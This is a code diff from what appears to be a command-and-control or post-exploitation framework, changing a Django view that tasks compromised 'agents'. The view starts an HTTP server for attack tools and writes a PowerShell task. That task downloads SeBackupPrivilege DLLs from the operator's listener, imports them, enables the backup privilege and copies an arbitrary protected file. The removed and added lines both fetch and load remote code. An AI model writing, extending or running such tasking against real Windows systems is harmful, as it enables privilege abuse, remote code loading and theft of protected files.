@@ -763,9 +763,11 @@ def SeBackUpPrivelege (request):
         # CmdLets_PATH = request.POST['CmdLets_PATH']        
         FileToCopy = request.POST['FileToCopy']
         outPut = request.POST['outPut']
-        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
-        #dll download
-        task = "IEX (New-Object Net.WebClient).DownloadString('http://{}:8888/SeBackupPrivilegeCmdLets.dll');IEX (New-Object Net.WebClient).DownloadString('http://{}:8888/SeBackupPrivilegeUtils.dll');Set-SeBackupPrivilege;Copy-FileSeBackupPrivilege '{}' .\{}".format(FileToCopy,outPut)
+        listenerdata = ListenerForm.objects.order_by("-created_date").get()
+        ip = listenerdata.ip
+        os.system("timeout 30 python3 -m http.server 8888 --directory {} &".format(tools_path))
+        #(New-Object Net.WebClient).DownloadFileAsync('http://{}:8888/SeBackupPrivilegeUtils.dll', $env:userprofile'\utils.dll')
+        task = "(New-Object Net.WebClient).DownloadFileAsync('http://{0}:8888/SeBackupPrivilegeCmdLets.dll', $env:userprofile'\CmdLets.dll');(New-Object Net.WebClient).DownloadFileAsync('http://{0}:8888/SeBackupPrivilegeUtils.dll', $env:userprofile'/utils.dll');import-module $env:userprofile'/utils.dll';import-module $env:userprofile'\CmdLets.dll';Set-SeBackupPrivilege;Copy-FileSeBackupPrivilege '{1}' .\{2}".format(ip,FileToCopy,outPut)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
             f.write(task)
